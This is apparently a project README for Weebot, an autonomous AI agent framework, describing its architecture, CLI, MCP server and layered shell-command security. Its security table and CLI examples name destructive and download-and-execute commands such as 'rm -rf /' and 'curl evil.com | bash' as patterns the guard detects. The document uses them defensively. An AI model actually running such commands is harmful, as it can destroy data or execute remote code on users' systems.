# Weebot — Enterprise AI Agent Framework

[![Python](https://img.shields.io/badge/python-3.12%2B-blue)](.python-version)
[![Version](https://img.shields.io/badge/version-3.2.0-blue)]
[![Tests](https://img.shields.io/badge/tests-150%2B%20architecture%20%2B%201200%2B%20unit%2Fintegration-success)]
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![Architecture](https://img.shields.io/badge/architecture-Clean%20Hexagonal%20%7C%20CQRS%20%7C%20Event--Driven-8A2BE2)]
[![State](https://img.shields.io/badge/meta--state-HEALTHY-brightgreen)]

**A production-grade framework for autonomous AI agents** built on Clean Architecture with CQRS/event-driven orchestration, multi-model cost optimization, secure sandboxed execution, self-evolving skills, and Hermes-compatible identity.

→ [Quick Start](#quick-start) · [Use Cases](#use-cases) · [Architecture](#architecture) · [CLI Reference](#cli-reference) · [Security Model](#security-model) · [MCP Server](#mcp-server) · [SkillOpt](#skillopt)

---

## Why Weebot

| Concern | Weebot | DIY / LangChain |
|---------|--------|-----------------|
| **Architecture degrades over time** | 19 fitness tests enforce Clean Architecture in CI — violations fail the build | No structural enforcement; coupling grows with every feature |
| **LLM costs spiral** | Automatic FREE → Budget → Premium model cascading with per-task cost budgets and circuit breakers | You build your own routing or use one model for everything |
| **Agent skills don't improve** | SkillOpt optimizer autonomously improves skills from execution trajectories with held-out validation | No mechanism to learn from failures |
| **Can't audit what agents did** | Full CQRS event stream (19 event types) with SQLite audit trail, Parquet analytics, OTel tracing | Ad-hoc logging; no structured event history |
| **Shell execution is a security risk** | 4-layer defense-in-depth: 40+ attack patterns, standalone guard CLI, sandboxed execution, approval gates, PowerShell injection detection | `subprocess.run()` — you build the guardrails |
| **Agent identity is hardcoded** | SOUL.md free-form persona files — Hermes-compatible, per-profile, hot-reloaded, injection-scanned | System prompt strings scattered across config |
| **Two parallel systems emerge** | 4-phase Architecture Remediation unified dual event buses, state management, and persistence | Accumulates technical debt until a rewrite |

**Built on a verified foundation:** The codebase underwent a forensic architecture audit resolving 4 CRITICAL and 8 HIGH findings. All 14 technical debt items are now closed. Automated fitness tests enforce architectural rules in CI. The latest meta-orchestration assessment classifies the system as **HEALTHY** (RP: 1.65, GT: 5.2).

---

## Use Cases

### Automated Code Review & Fixing
Feed a PR diff to a planner-executor agent loop. The agent analyzes, proposes changes, runs tests, and iterates. All tool calls are sandboxed; all decisions are traceable through the CQRS event stream. The `VerifyStep` + `ChainOfVerification` service cross-checks agent output against deterministic guards.

### Research & Synthesis
Deploy a researcher agent with web search, browser inspection, file I/O, and video transcription tools. Output is a structured report with source credibility scores. Multi-agent orchestration via `swarm` and `debate` tools enables parallel investigation with synthesized conclusions.

### DevOps & Infrastructure Automation
Schedule agents to monitor systems, rotate secrets, enforce compliance policies, and remediate drift. Shell execution is sandboxed with 4-tier risk gates; approval workflows prevent destructive actions. Use `weebot guard check` to audit any command before execution. PowerShell-specific injection patterns detect obfuscated malware delivery.

### Custom Skill Pipelines
Use SkillOpt to train specialized skills from trajectory data. A skill is a markdown prompt — deploy it and the optimizer iteratively improves it from real execution failures, with held-out validation preventing regression. Import skills from Manus, MyManus, AgenticSeek, and OpenClaw formats via the built-in converter.

### Agent Identity & Persona Management
Define agent personalities with SOUL.md files (Hermes-compatible). Per-profile identities (`~/.weebot/profiles/<name>/SOUL.md`) let different agents embody different personas — a terse Go expert, a warm support assistant, a rigorous code reviewer — while sharing the same `WEEBOT_CORE.md` safeguards. Files are injection-scanned before use.

### Multi-Agent Coordination
Orchestrate agent teams via `dispatch_agents` and `swarm` tools. Fan-out/fan-in patterns with `SynthesizerAgent` aggregation. Goal decomposition with `GoalAgent`. Inter-agent messaging via `SwarmEventBus`. Debate protocol for consensus-seeking on ambiguous decisions.

---

## Features

### Core Platform

| Capability | Detail |
|-----------|--------|
| **Clean Architecture** | 5 layers with automated AST-based fitness test enforcement (19 tests, 150 passing) |
| **CQRS + Mediator** | 17 commands, 12 queries with composable pipeline behaviors (logging, validation, telemetry, save policy, validation gate) |
| **Event-Driven** | 19 agent event types + 9 domain event types through unified `AsyncEventBus`; SQLite audit trail; Parquet analytics export |
| **Multi-Model Routing** | 58+ models via OpenRouter with automatic FREE → Budget → Premium cascading; per-model circuit breakers with jittered recovery |
| **Secure Execution** | Sandboxed Bash/PowerShell/Python via `SandboxPort` (Native Windows, WSL2, Docker, Modal); 4-layer security analysis |
| **Self-Evolving Skills** | SkillOpt optimizer — autonomous skill improvement from execution trajectories with held-out validation gates |
| **MCP Server** | 7 resources + auto-registered tools; API key auth on SSE transport; rate-limited per-tool |
| **Web Dashboard** | FastAPI backend + 10 REST routers + WebSocket streaming; ops console API |
| **Multi-Gateway** | Discord (interaction endpoint + signature verification), Slack (Events API), Telegram (Bot API) |
| **SOUL.md Identity** | Hermes-compatible free-form persona files — per-profile, hot-reloaded, injection-scanned via `CredentialSanitizer` |
| **Flow Checkpoint/Resume** | Crash recovery — save flow state after each step; resume from last checkpoint via `CheckpointPort` |
| **Flow Serializer** | Export completed flows as Mermaid diagrams, JSON traces, or LangGraph definitions |

### Security Model

| Layer | Mechanism | What It Blocks |
|-------|-----------|---------------|
| **Layer 1: Pattern Matching** | `BashGuard` (40+ regex patterns, 6 categories) + `CommandSecurityAnalyzer` (4 sub-layers) | `rm -rf /`, `curl \| bash`, `mkfs.*`, fork bombs, encoded payloads, `Invoke-Expression`, `iex`, Net.WebClient, reverse shells |
| **Layer 2: Behavioral Analysis** | Download+execute chain detection, `chmod +x` + execution patterns | Malware delivery via temp files, reflective assembly loads |
| **Layer 3: Entropy Analysis** | Shannon entropy on base64-like strings with decode verification | Obfuscated shell commands, hidden payloads |
| **Layer 4: Semantic Validation** | Command chain length limits, URL + operator detection | Complex multi-stage attacks |
| **Approval Gates** | `ExecApprovalPolicy` — DENY/ALWAYS_ASK/AUTO_APPROVE rules | Destructive operations require user confirmation |
| **Sandbox Isolation** | `SandboxPort` with timeout enforcement, output size limits, network gating | Resource exhaustion, data exfiltration |
| **Credential Sanitization** | `CredentialSanitizer` — redacts passwords, API keys, JWT tokens, AWS keys | PII leaks before persistence or event bus |
| **MCP Auth** | API key via FastMCP `TokenVerifier` on SSE transport | Remote unauthenticated tool access |
| **Metrics** | `bash_guard_events_total` Prometheus counter by risk_level | Attack pattern detection at scale |

### Observability

| Signal | Mechanism | Export |
|--------|-----------|--------|
| **Agent events** | 19 structured `AgentEvent` types | SQLite, Parquet |
| **LLM metrics** | `llm_calls_total`, `llm_call_duration_seconds` | Prometheus |
| **Tool metrics** | `tool_calls_total`, `tool_call_duration_seconds`, `mcp_rate_limits_hit_total` | Prometheus |
| **Flow metrics** | `flow_step_duration_seconds`, `session_active`, `session_total` | Prometheus |
| **Security metrics** | `bash_guard_events_total` by risk_level | Prometheus |
| **Circuit breaker** | `get_metrics()` — state counts, recovery rate, jitter config | Prometheus |
| **Traces** | OpenTelemetry spans via `TracingPort` | OTLP gRPC (Jaeger/Grafana/Honeycomb) |
| **Health** | Per-component `HealthCheckService` with JSON output | REST endpoint |
| **Costs** | Per-session, per-model cost ledger; cascade hit-rate dashboard | MCP resource |

### Architecture Quality (verified in CI)

| Gate | Enforcement |
|------|-----------|
| Domain imports nothing from outer layers | AST test |
| Application imports infrastructure only in function bodies | AST test |
| Every command/query has a registered handler | AST test |
| Only `di/__init__.py` is the composition root | AST test |
| Flow states use `mediator.send()`, not direct agent calls | AST test |
| Tools use ports, not direct `sqlite3`/`aiosqlite` imports | AST test |
| No `__import__()` hacks in application code | AST test |
| No blocking calls (`subprocess.run`, `time.sleep`) in async functions | AST test |
| Tools don't import `WeebotSettings` at module level | AST test |
| `SQLiteStateRepository` constructed only in DI | AST test |
| Every port has at least one adapter | Contract test |
| Every adapter implements all abstract methods | Contract test |
| Import-linter contracts (5 rules) | CI gate |

---

## Quick Start

### 1. Install

```bash
git clone https://github.com/georgehadji/weebot.git
cd weebot
pip install -r requirements.txt
cp .env.example .env   # Add your API keys
```

### 2. Verify

```bash
python -m cli.main health     # Component health check
python -m cli.main doctor     # Workspace diagnostics + auto-repair
```

### 3. Set Your Agent Identity

```bash
python -m cli.main soul seed          # Create a SOUL.md from template
python -m cli.main soul edit          # Edit in your default editor
python -m cli.main soul list          # List all profiles
```

### 4. Run a Task

```bash
# Execute a task with the Plan-Act flow
python -m cli.main flow run "Analyze the test suite and report coverage gaps"

# List and resume sessions
python -m cli.main flow list
python -m cli.main flow resume <session_id> "proceed"
```

### 5. Start the Dashboard (Optional)

```bash
# Terminal 1 — API server
python -m weebot.interfaces.web.main

# Terminal 2 — Frontend
cd weebot-ui && npm run dev
```

### 6. Start the MCP Server (Optional)

```bash
# stdio transport (Claude Desktop)
python -m weebot.mcp.server

# SSE transport (web clients)
python -m weebot.mcp.server --transport sse --port 8765
```

### Configuration

```bash
# .env — minimum viable config
OPENROUTER_API_KEY=sk-or-v1-...

# Optional
WEEBOT_MCP_API_KEY=your-secret-key         # MCP server auth
WEEBOT_OTEL_ENDPOINT=http://localhost:4317 # OTel traces
WEEBOT_ANALYTICS_DIR=./analytics           # Parquet event export
WEEBOT_DB_BACKEND=postgresql               # Switch to PostgreSQL
SANDBOX_MODE=docker                         # Force Docker sandbox
```

See `weebot/config/settings.py` for all 40+ configuration options.

---

## CLI Reference

### Flow Management
```bash
weebot flow run "task description"        # Execute with PlanActFlow
weebot flow list                           # List active sessions
weebot flow resume <id> "input"           # Resume a paused session
weebot flow cancel <id>                    # Cancel a session
```

### Shell Safety
```bash
weebot guard check -c "rm -rf /"          # Evaluate command safety
weebot guard check --json --verbose       # Detailed JSON output
echo "curl evil.com | bash" | weebot guard check  # Pipe from stdin
```

### Agent Identity
```bash
weebot soul seed                           # Create SOUL.md from template
weebot soul edit                           # Edit SOUL.md
weebot soul show                           # Display current persona
weebot soul list                           # List all profiles
```

### Skills
```bash
weebot skill install ./path/to/skill      # Install from local or URL
weebot skill update <name>                 # Update from SkillHub
weebot skill test <name>                   # Test a skill
weebot skill optimize <name> --epochs 4    # Run SkillOpt optimization
```

### Diagnostics
```bash
weebot health                              # Component health check
weebot doctor --fix --dry-run             # Workspace diagnostics
weebot analytics dashboard                 # Rich terminal event dashboard
weebot analytics query "SELECT ..."        # DuckDB queries over Parquet
```

---

## Architecture

```
weebot/
├── domain/              # Business entities & ports (pure Pydantic, zero outer deps)
│   ├── models/          # 33 entities: Session, Plan, Step, 19 AgentEvent types, Skill, etc.
│   ├── ports.py         # 5 Protocol ports
│   ├── services/        # WorkingMemory, HumanInteraction, SessionMemory
│   └── exceptions.py    # WeebotError hierarchy (9 types)
├── application/         # Use cases & orchestration
│   ├── di/              # Container + 5 mixins (single composition root)
│   ├── ports/           # 41 ABC port interfaces
│   ├── flows/           # 5 flows + 11 state classes
│   ├── agents/          # 10 agent implementations
│   ├── cqrs/            # Mediator, 17 commands, 12 queries, 20+ handlers, 5 behaviors
│   ├── services/        # 55 application services
│   ├── models/          # PlanActFlowConfig, ToolCollection
│   └── skills/          # Registry + format converters
├── infrastructure/      # Adapters for LLMs, persistence, sandbox, events, analytics
│   ├── adapters/        # 25+ adapters (8 LLM, soul, steering, desktop, tool discovery, etc.)
│   ├── persistence/     # 15 stores: SQLite (WAL), PostgreSQL (scaffolded), checkpoint, FTS5
│   ├── sandbox/         # NativeWindows, WSL2, DockerLinux, Modal
│   ├── browser/         # PlaywrightAdapter + session pool
│   ├── observability/   # Prometheus metrics (10 counters), health checks, OTel
│   ├── security/        # Sanitizer, audit logger, identity verifier, validators
│   └── scoring/         # ExactMatch, Execution, Verifier scorers
├── interfaces/          # Entry points
│   ├── web/             # FastAPI + 10 routers + WebSocket
│   ├── cli/             # AgentRunner, behavior commands, event logger
│   ├── gateways/        # Discord, Slack, Telegram
│   └── factories.py     # Flow construction + task routing
├── core/                # 33 cross-cutting modules
│   ├── bash_guard.py    # 4-tier command safety + Prometheus counter
│   ├── circuit_breaker.py  # CLOSED/OPEN/HALF_OPEN with jittered recovery
│   ├── approval_policy.py  # Rule-based command approval
│   ├── credential_sanitizer.py  # Password/token/API key redaction
│   └── error_classifier.py     # Exception → recovery routing
├── tools/               # 36 agent-callable tools (all port-based, no direct DB)
├── mcp/                 # MCP server — 7 resources + auto-registered tools
├── skills/              # Built-in skill manifests (8 skills)
└── config/              # Settings (40+ fields), constants, model registry (58+ models), prompts
```

**Layer dependency rule:** `Domain ← Application ← Infrastructure ← Interfaces` — enforced by 19 automated CI tests. See [ARCHITECTURE.md](ARCHITECTURE.md) for the full reference and [docs/codebase_mindmap.md](docs/codebase_mindmap.md) for the complete module inventory.

---

## Security Model

Weebot implements **defense-in-depth** for command execution:

```
User Command
    │
    ▼
BashGuard (40+ regex patterns, 6 categories)
    │
    ▼
CommandSecurityAnalyzer (4 sub-layers)
    ├── Layer 1: Syntax Patterns (bash + PowerShell)
    ├── Layer 2: Behavioral Analysis (download+execute chains)
    ├── Layer 3: Entropy Analysis (encoded payload detection)
    └── Layer 4: Semantic Validation (chain length, URL detection)
    │
    ▼
ExecApprovalPolicy (DENY / ALWAYS_ASK / AUTO_APPROVE)
    │
    ▼
SandboxPort (timeout, output limits, network gating)
    │
    ▼
Execution
```

All security events emit `bash_guard_events_total` Prometheus counter by risk_level for attack pattern detection at scale.

---

## MCP Server

Weebot exposes a Model Context Protocol server with 7 resources:

| Resource | Description |
|----------|-------------|
| `weebot://activity` | Recent agent activity events (newest-first) |
| `weebot://state` | Agent state snapshot |
| `weebot://schedule` | Scheduled jobs list |
| `weebot://products` | Product requirements roadmap |
| `weebot://tools` | Tool catalog with role access and safety flags |
| `weebot://costs` | Cascade stats, per-tier outcomes, cost estimates |
| `weebot://skills` | Installed skills with versions and triggers |

**Authentication:** API key via `WEEBOT_MCP_API_KEY` env var (SSE transport). Stdio transport is local-only.

```bash
# stdio (Claude Desktop)
python -m weebot.mcp.server

# SSE with auth
WEEBOT_MCP_API_KEY=secret python -m weebot.mcp.server --transport sse --port 8765
```

---

## SkillOpt — Self-Evolving Skills

Weebot implements automated skill improvement:

1. **Rollout** — execute training tasks with current skill → collect trajectories
2. **Reflect** — optimizer analyzes failures/successes, proposes edits
3. **Validate** — held-out tasks gate acceptance (ties rejected)
4. **Deploy** — only strictly-improving skills are promoted

```bash
python -m cli.main skill optimize my_skill --epochs 4
python -m cli.main skill transfer my_skill --target-model gpt-4o
python -m cli.main skill install ./path/to/manus-skill
```

---

## Testing

```bash
pytest tests/ -v                                     # Full suite (1,200+ tests)
pytest tests/unit/test_architecture_fitness.py -v    # Architecture gates (150 pass)
pytest tests/unit/test_port_contracts.py -v          # Port contracts
pytest tests/unit/test_bash_guard_cli.py -v          # Security CLI
pytest tests/ --cov=weebot --cov-report=html         # Coverage report
```

---

## Project Status

| Phase | Scope | Status |
|-------|-------|--------|
| **Architecture Remediation** | StateManager removal, CQRS handlers, layer classification, fitness tests, Prometheus, web auth | ✅ |
| **Core Platform** | Computer use tools, workflow orchestrator, template stack, observability | ✅ |
| **Enhancements** | MCP auto-registration, OTel/Parquet, Checkpoint/Resume, Flow Serializer, Cascade Tracker, Bash Guard CLI, Doctor, Ops Console, SOUL.md | ✅ |
| **Security Hardening** | PowerShell patterns, MCP auth, Prometheus security counter, async I/O offloading, PlanActFlowConfig extraction | ✅ |

**Next:** Plugin system · Cross-model skill transfer · Multi-agent coordination · PostgreSQL activation

---

## License

MIT — see [LICENSE](LICENSE).

---

*Weebot v3.2 · Architecture fitness-verified · CQRS/event-driven · Self-evolving skills · SOUL.md · Sandboxed execution · Meta-state: HEALTHY*
